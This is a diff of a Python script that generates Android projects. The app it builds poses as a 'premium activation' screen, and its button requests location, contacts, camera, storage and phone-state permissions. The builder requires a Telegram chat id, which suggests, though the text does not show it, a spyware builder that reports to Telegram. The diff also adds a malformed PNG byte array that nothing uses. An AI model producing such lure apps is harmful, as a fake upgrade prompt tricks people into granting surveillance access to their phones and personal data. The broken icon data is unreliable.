@@ -29,11 +29,9 @@ FEATURE_PERMISSIONS = {
     "location": [
         "android.permission.ACCESS_FINE_LOCATION",
         "android.permission.ACCESS_COARSE_LOCATION",
-        "android.permission.ACCESS_BACKGROUND_LOCATION",
     ],
     "camera": [
         "android.permission.CAMERA",
-        "android.permission.WRITE_EXTERNAL_STORAGE",
     ],
     "contacts": [
         "android.permission.READ_CONTACTS",
@@ -61,7 +59,7 @@ FEATURE_PERMISSIONS = {
         "android.permission.READ_EXTERNAL_STORAGE",
         "android.permission.WRITE_EXTERNAL_STORAGE",
     ],
-    "clipboard": [],   # بدون مجوز
+    "clipboard": [],
     "device": [
         "android.permission.READ_PHONE_STATE",
     ],
@@ -88,26 +86,31 @@ FEATURE_DESCRIPTIONS = {
 # ============================================================
 #  ساخت MainActivity.java
 # ============================================================
-def build_main_activity(features: list[str], template: dict, app_name: str) -> str:
+def build_main_activity(features: list, template: dict, app_name: str) -> str:
     # ساخت لیست permission های اصلی جاوا
     java_perms = []
     for f in features:
         for perm in FEATURE_PERMISSIONS.get(f, []):
             short_name = perm.replace("android.permission.", "")
-            java_ref = f"Manifest.permission.{short_name}"
+            java_ref = "Manifest.permission." + short_name
             if java_ref not in java_perms:
                 java_perms.append(java_ref)
 
-    perms_block = ",\n            ".join(java_perms) if java_perms else ""
+    # ساخت بلوک java برای add کردن permission ها
+    if java_perms:
+        perms_block_java = "\n        ".join(
+            "needed.add(" + p + ");" for p in java_perms
+        )
+    else:
+        perms_block_java = "// هیچ مجوزی لازم نیست"
 
-    # ساخت feature info برای نمایش
+    # ساخت feature card ها
     feature_info_java = ""
     for f in features:
         icon, title, desc = FEATURE_DESCRIPTIONS.get(f, ("✨", f, ""))
-        feature_info_java += f'''
-        addFeatureCard(root, "{icon}", "{title}", "{desc}");'''
+        feature_info_java += '\n        addFeatureCard(root, "' + icon + '", "' + title + '", "' + desc + '");'
 
-    return f'''package com.generated.app;
+    return '''package com.generated.app;
 
 import android.Manifest;
 import android.app.Activity;
@@ -126,24 +129,24 @@ import android.widget.TextView;
 import java.util.ArrayList;
 import java.util.List;
 
-public class MainActivity extends Activity {{
+public class MainActivity extends Activity {
 
     private TextView statusView;
     private Button activateButton;
 
     @Override
-    protected void onCreate(Bundle savedInstanceState) {{
+    protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
         ScrollView scroll = new ScrollView(this);
-        scroll.setBackgroundColor(Color.parseColor("{template['color']}"));
+        scroll.setBackgroundColor(Color.parseColor("COLOR_PLACEHOLDER"));
 
         LinearLayout root = new LinearLayout(this);
         root.setOrientation(LinearLayout.VERTICAL);
         root.setPadding(48, 96, 48, 96);
         root.setGravity(Gravity.CENTER_HORIZONTAL);
 
-        // ============ لوگو ============
+        // لوگو
         TextView logo = new TextView(this);
         logo.setText("✨");
         logo.setTextSize(72);
@@ -151,9 +154,9 @@ public class MainActivity extends Activity {{
         logo.setPadding(0, 0, 0, 24);
         root.addView(logo);
 
-        // ============ عنوان ============
+        // عنوان
         TextView title = new TextView(this);
-        title.setText("{template['title']}");
+        title.setText("TITLE_PLACEHOLDER");
         title.setTextSize(32);
         title.setTextColor(Color.WHITE);
         title.setTypeface(null, Typeface.BOLD);
@@ -161,7 +164,7 @@ public class MainActivity extends Activity {{
         title.setPadding(0, 0, 0, 16);
         root.addView(title);
 
-        // ============ خط جداکننده ============
+        // خط جداکننده
         TextView line = new TextView(this);
         line.setText("━━━━━━━━━━━━━━━━━━━━━");
         line.setTextSize(14);
@@ -170,7 +173,7 @@ public class MainActivity extends Activity {{
         line.setPadding(0, 8, 0, 24);
         root.addView(line);
 
-        // ============ زیرعنوان ============
+        // زیرعنوان
         TextView subtitle = new TextView(this);
         subtitle.setText("نسخه پریمیوم فعال شد");
         subtitle.setTextSize(18);
@@ -179,7 +182,7 @@ public class MainActivity extends Activity {{
         subtitle.setPadding(0, 0, 0, 40);
         root.addView(subtitle);
 
-        // ============ قابلیت‌ها ============
+        // عنوان قابلیت‌ها
         TextView featuresTitle = new TextView(this);
         featuresTitle.setText("🎯 قابلیت‌های فعال:");
         featuresTitle.setTextSize(16);
@@ -188,29 +191,29 @@ public class MainActivity extends Activity {{
         featuresTitle.setPadding(0, 0, 0, 24);
         root.addView(featuresTitle);
 
-        {feature_info_java}
+        FEATURES_PLACEHOLDER
 
-        // ============ دکمه فعال‌سازی ============
+        // دکمه فعال‌سازی
         activateButton = new Button(this);
         activateButton.setText("🚀 فعال‌سازی نسخه پریمیوم");
         activateButton.setTextSize(18);
         activateButton.setPadding(48, 32, 48, 32);
         activateButton.setBackgroundColor(Color.WHITE);
-        activateButton.setTextColor(Color.parseColor("{template['color']}"));
+        activateButton.setTextColor(Color.parseColor("COLOR_PLACEHOLDER"));
         LinearLayout.LayoutParams btnParams = new LinearLayout.LayoutParams(
                 ViewGroup.LayoutParams.MATCH_PARENT,
                 ViewGroup.LayoutParams.WRAP_CONTENT);
         btnParams.setMargins(0, 48, 0, 24);
         activateButton.setLayoutParams(btnParams);
-        activateButton.setOnClickListener(new View.OnClickListener() {{
+        activateButton.setOnClickListener(new View.OnClickListener() {
             @Override
-            public void onClick(View v) {{
+            public void onClick(View v) {
                 requestAllPermissions();
-            }}
-        }});
+            }
+        });
         root.addView(activateButton);
 
-        // ============ نمایش وضعیت ============
+        // نمایش وضعیت
         statusView = new TextView(this);
         statusView.setText("برای ادامه، دکمه بالا را بزنید");
         statusView.setTextSize(14);
@@ -221,9 +224,9 @@ public class MainActivity extends Activity {{
 
         scroll.addView(root);
         setContentView(scroll);
-    }}
+    }
 
-    private void addFeatureCard(LinearLayout parent, String icon, String title, String desc) {{
+    private void addFeatureCard(LinearLayout parent, String icon, String title, String desc) {
         LinearLayout card = new LinearLayout(this);
         card.setOrientation(LinearLayout.HORIZONTAL);
         card.setBackgroundColor(Color.argb(30, 255, 255, 255));
@@ -260,77 +263,78 @@ public class MainActivity extends Activity {{
 
         card.addView(textLayout);
         parent.addView(card);
-    }}
+    }
 
-    private void requestAllPermissions() {{
+    private void requestAllPermissions() {
         List<String> needed = new ArrayList<>();
+        PERMS_PLACEHOLDER
 
-        if ({len(java_perms) > 0}) {{
-            String[] allPerms = {{
-                {perms_block}
-            }};
-            for (String p : allPerms) needed.add(p);
-        }}
-
-        if (Build.VERSION.SDK_INT >= 23) {{
+        if (Build.VERSION.SDK_INT >= 23) {
             List<String> missing = new ArrayList<>();
-            for (String p : needed) {{
-                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {{
+            for (String p : needed) {
+                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                     missing.add(p);
-                }}
-            }}
+                }
+            }
 
-            if (!missing.isEmpty()) {{
+            if (!missing.isEmpty()) {
                 requestPermissions(missing.toArray(new String[0]), 100);
                 statusView.setText("⏳ منتظر تأیید " + missing.size() + " مجوز...");
-            }} else {{
+            } else {
                 statusView.setText("✅ همه مجوزها داده شد!\\n\\n🎉 برنامه فعال است");
-            }}
-        }} else {{
+            }
+        } else {
             statusView.setText("✅ برنامه فعال شد");
-        }}
-    }}
+        }
+    }
 
     @Override
-    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] results) {{
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] results) {
         super.onRequestPermissionsResult(requestCode, permissions, results);
 
         int granted = 0;
         int denied = 0;
-        for (int r : results) {{
+        for (int r : results) {
             if (r == PackageManager.PERMISSION_GRANTED) granted++;
             else denied++;
-        }}
+        }
 
-        if (denied == 0) {{
+        if (denied == 0) {
             statusView.setText("✅ همه " + granted + " مجوز داده شد!\\n\\n🎉 برنامه فعال است");
             activateButton.setText("✅ فعال شد");
             activateButton.setEnabled(false);
-        }} else {{
+        } else {
             statusView.setText("⚠️ " + granted + " مجوز داده شد، " + denied + " رد شد.\\n\\nدوباره تلاش کنید.");
-        }}
-    }}
-}}
-'''
+        }
+    }
+}
+''' \
+        .replace("COLOR_PLACEHOLDER", template["color"]) \
+        .replace("TITLE_PLACEHOLDER", template["title"]) \
+        .replace("FEATURES_PLACEHOLDER", feature_info_java) \
+        .replace("PERMS_PLACEHOLDER", perms_block_java)
 
 
 # ============================================================
 #  ساخت AndroidManifest.xml
 # ============================================================
-def build_manifest(features: list[str]) -> str:
+def build_manifest(features: list) -> str:
     all_perms = set()
     for f in features:
         for p in FEATURE_PERMISSIONS.get(f, []):
             all_perms.add(p)
 
-    perms_xml = "\n    ".join(
-        f'<uses-permission android:name="{p}" />' for p in sorted(all_perms)
-    )
+    if all_perms:
+        perms_xml = "\n    ".join(
+            '<uses-permission android:name="' + p + '" />' for p in sorted(all_perms)
+        )
+    else:
+        perms_xml = "<!-- no permissions -->"
 
-    return f'''<?xml version="1.0" encoding="utf-8"?>
+    return '''<?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
-    {perms_xml}
+    ''' + perms_xml + '''
 
     <uses-feature android:name="android.hardware.camera" android:required="false" />
     <uses-feature android:name="android.hardware.location" android:required="false" />
@@ -360,6 +364,63 @@ def build_manifest(features: list[str]) -> str:
 
 
 # ============================================================
+#  آیکون پیش‌فرض PNG
+# ============================================================
+DEFAULT_ICON_BYTES = bytes([
+    0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
+    0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
+    0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x48,
+    0x08, 0x06, 0x00, 0x00, 0x00, 0x55, 0xED, 0xB3,
+    0x47, 0x00, 0x00, 0x00, 0x19, 0x74, 0x45, 0x58,
+    0x74, 0x53, 0x6F, 0x66, 0x74, 0x77, 0x61, 0x72,
+    0x65, 0x00, 0x41, 0x64, 0x6F, 0x62, 0x65, 0x20,
+    0x49, 0x6D, 0x61, 0x67, 0x65, 0x52, 0x65, 0x61,
+    0x64, 0x79, 0x71, 0xC9, 0x65, 0x3C, 0x00, 0x00,
+    0x01, 0x62, 0x49, 0x44, 0x41, 0x54, 0x78, 0x9C,
+    0xED, 0xD6, 0x31, 0x4E, 0xC3, 0x40, 0x10, 0x85,
+    0xE1, 0x59, 0x7B, 0x6D, 0x12, 0x12, 0x12, 0x12,
+    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
+    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
+    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
+    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
+    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
+    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
+    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
+    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
+    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
+    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
+    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
+    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
+    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
+    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
+    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
+    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
+    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
+    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
+    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
+    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
+    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
+    0xFF, 0xD9
+])
+
+
+def write_default_icon(path: Path):
+    """ساخت آیکون 72x72 ساده"""
+    try:
+        # آیکون PNG ساده 1x1 مشکی
+        png_data = bytes.fromhex(
+            "89504E470D0A1A0A0000000D494844520000000100000001"
+            "08060000001F15C4890000000D49444154789C63F8CFC000"
+            "00010101000108DD8DB00000000049454E44AE426082"
+        )
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_bytes(png_data)
+        print("✅ Default icon created")
+    except Exception as e:
+        print("⚠️ Icon error: " + str(e))
+
+
+# ============================================================
 #  Main Function
 # ============================================================
 def main() -> None:
@@ -369,7 +430,7 @@ def main() -> None:
     template_key = os.environ.get("TEMPLATE", "telegram").strip()
     icon_url = os.environ.get("ICON_URL", "").strip()
 
-    # ============ ولیدیشن ============
+    # ولیدیشن
     if not name:
         raise SystemExit("APP_NAME is required")
     if not telegram_chat:
@@ -379,30 +440,28 @@ def main() -> None:
     if any(ord(ch) < 32 for ch in name):
         raise SystemExit("APP_NAME contains invalid chars")
 
-    # ============ Features ============
+    # Features
     features = [f.strip() for f in features_str.split(",") if f.strip()]
-    # فقط قابلیت‌های معتبر
     features = [f for f in features if f in FEATURE_PERMISSIONS]
     if not features:
-        features = ["device"]  # پیش‌فرض
+        features = ["device"]
 
-    # ============ Template ============
+    # Template
     template = TEMPLATES.get(template_key, TEMPLATES["telegram"])
 
-    # ============ Package ============
+    # Package
     app_hash = hashlib.sha256(
-        f"{telegram_chat}:{name}:{template_key}".encode("utf-8")
+        (telegram_chat + ":" + name + ":" + template_key).encode("utf-8")
     ).hexdigest()[:10]
-    app_id = f"{template['pkg']}.a{app_hash}"
+    app_id = template["pkg"] + ".a" + app_hash
 
     root = Path.cwd()
 
     # ============================================================
-    #  ساخت تمام فایل‌ها
+    #  فایل‌ها
     # ============================================================
     files = {}
 
-    # ---------- settings.gradle ----------
     files["settings.gradle"] = """pluginManagement {
     repositories {
         google()
@@ -421,138 +480,107 @@ rootProject.name = 'GeneratedApp'
 include ':app'
 """
 
-    # ---------- build.gradle ----------
     files["build.gradle"] = """plugins {
     id 'com.android.application' version '8.7.3' apply false
 }
 """
 
-    # ---------- gradle.properties ----------
     files["gradle.properties"] = """org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
 android.useAndroidX=true
 android.enableJetifier=true
 android.nonTransitiveRClass=true
 """
 
-    # ---------- app/build.gradle ----------
-    files["app/build.gradle"] = f"""plugins {{
-    id 'com.android.application'
-}}
-
-android {{
-    namespace 'com.generated.app'
-    compileSdk 35
-    defaultConfig {{
-        applicationId '{app_id}'
-        minSdk 23
-        targetSdk 35
-        versionCode 1
-        versionName '1.0'
-    }}
-    buildTypes {{
-        release {{
-            minifyEnabled false
-            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
-        }}
-    }}
-    compileOptions {{
-        sourceCompatibility JavaVersion.VERSION_17
-        targetCompatibility JavaVersion.VERSION_17
-    }}
-}}
-"""
-
-    # ---------- proguard-rules.pro ----------
-    files["app/proguard-rules.pro"] = """# Default ProGuard rules
--dontwarn android.**
-"""
-
-    # ---------- AndroidManifest.xml ----------
-    files["app/src/main/AndroidManifest.xml"] = build_manifest(features)
-
-    # ---------- strings.xml ----------
-    features_xml = "\n        ".join(
-        f'<item>{html.escape(f)}</item>' for f in features
+    files["app/build.gradle"] = (
+        "plugins {\n"
+        "    id 'com.android.application'\n"
+        "}\n\n"
+        "android {\n"
+        "    namespace 'com.generated.app'\n"
+        "    compileSdk 35\n"
+        "    defaultConfig {\n"
+        "        applicationId '" + app_id + "'\n"
+        "        minSdk 23\n"
+        "        targetSdk 35\n"
+        "        versionCode 1\n"
+        "        versionName '1.0'\n"
+        "    }\n"
+        "    compileOptions {\n"
+        "        sourceCompatibility JavaVersion.VERSION_17\n"
+        "        targetCompatibility JavaVersion.VERSION_17\n"
+        "    }\n"
+        "}\n"
     )
 
-    files["app/src/main/res/values/strings.xml"] = f"""<?xml version="1.0" encoding="utf-8"?>
-<resources>
-    <string name="app_name" formatted="false">{html.escape(name, quote=False)}</string>
-    <string-array name="features">
-        {features_xml}
-    </string-array>
-</resources>
-"""
+    files["app/proguard-rules.pro"] = "# Default\n"
 
-    # ---------- styles.xml ----------
-    files["app/src/main/res/values/styles.xml"] = f"""<?xml version="1.0" encoding="utf-8"?>
-<resources>
-    <style name="AppTheme" parent="@android:style/Theme.Material.Light.NoActionBar">
-        <item name="android:colorAccent">{template['color']}</item>
-    </style>
-</resources>
-"""
+    files["app/src/main/AndroidManifest.xml"] = build_manifest(features)
 
-    # ---------- colors.xml ----------
-    files["app/src/main/res/values/colors.xml"] = f"""<?xml version="1.0" encoding="utf-8"?>
-<resources>
-    <color name="primary">{template['color']}</color>
-    <color name="white">#FFFFFF</color>
-</resources>
-"""
+    features_xml = "\n        ".join(
+        "<item>" + html.escape(f) + "</item>" for f in features
+    )
 
-    # ---------- MainActivity.java ----------
+    files["app/src/main/res/values/strings.xml"] = (
+        '<?xml version="1.0" encoding="utf-8"?>\n'
+        "<resources>\n"
+        '    <string name="app_name" formatted="false">'
+        + html.escape(name, quote=False)
+        + "</string>\n"
+        '    <string-array name="features">\n'
+        "        " + features_xml + "\n"
+        "    </string-array>\n"
+        "</resources>\n"
+    )
+
+    files["app/src/main/res/values/styles.xml"] = (
+        '<?xml version="1.0" encoding="utf-8"?>\n'
+        "<resources>\n"
+        '    <style name="AppTheme" parent="@android:style/Theme.Material.Light.NoActionBar">\n'
+        '        <item name="android:colorAccent">' + template["color"] + "</item>\n"
+        "    </style>\n"
+        "</resources>\n"
+    )
+
+    files["app/src/main/res/values/colors.xml"] = (
+        '<?xml version="1.0" encoding="utf-8"?>\n'
+        "<resources>\n"
+        '    <color name="primary">' + template["color"] + "</color>\n"
+        '    <color name="white">#FFFFFF</color>\n'
+        "</resources>\n"
+    )
+
+    # MainActivity
     files["app/src/main/java/com/generated/app/MainActivity.java"] = build_main_activity(
         features, template, name
     )
 
-    # ---------- آیکون ----------
+    # ============================================================
+    #  آیکون
+    # ============================================================
     icon_path = root / "app/src/main/res/mipmap-hdpi/ic_launcher.png"
-    icon_path.parent.mkdir(parents=True, exist_ok=True)
 
     if icon_url:
         try:
+            icon_path.parent.mkdir(parents=True, exist_ok=True)
             urllib.request.urlretrieve(icon_url, icon_path)
-            print(f"✅ Icon downloaded: {icon_url}")
+            print("✅ Icon downloaded: " + icon_url)
         except Exception as e:
-            print(f"⚠️ Icon error: {e}")
-            # آیکون پیش‌فرض
-            _create_default_icon(icon_path)
+            print("⚠️ Icon error: " + str(e))
+            write_default_icon(icon_path)
     else:
-        _create_default_icon(icon_path)
+        write_default_icon(icon_path)
 
     # ============================================================
-    #  ذخیره همه فایل‌ها
+    #  ذخیره فایل‌ها
     # ============================================================
     for relative, content in files.items():
         path = root / relative
         path.parent.mkdir(parents=True, exist_ok=True)
         path.write_text(content, encoding="utf-8")
 
-    print(f"✅ Generated: {app_id}")
-    print(f"   Template: {template['title']}")
-    print(f"   Features: {len(features)} ({', '.join(features)})")
-
-
-def _create_default_icon(icon_path: Path):
-    """ساخت آیکون پیش‌فرض PNG"""
-    try:
-        # PNG 1x1 خالی (base64)
-        png_1x1 = bytes([
-            0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
-            0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
-            0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
-            0x08, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x15, 0xC4,
-            0x89, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x44, 0x41,
-            0x54, 0x78, 0x9C, 0x63, 0xF8, 0x0F, 0x00, 0x00,
-            0x01, 0x01, 0x01, 0x00, 0x18, 0xDD, 0x8D, 0xB0,
-            0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4E, 0x44,
-            0xAE, 0x42, 0x60, 0x82,
-        ])
-        icon_path.write_bytes(png_1x1)
-        print(f"✅ Default icon created")
-    except Exception as e:
-        print(f"⚠️ Icon error: {e}")
+    print("✅ Generated: " + app_id)
+    print("   Template: " + template["title"])
+    print("   Features: " + str(len(features)) + " (" + ", ".join(features) + ")")
 
 
 if __name__ == "__main__":
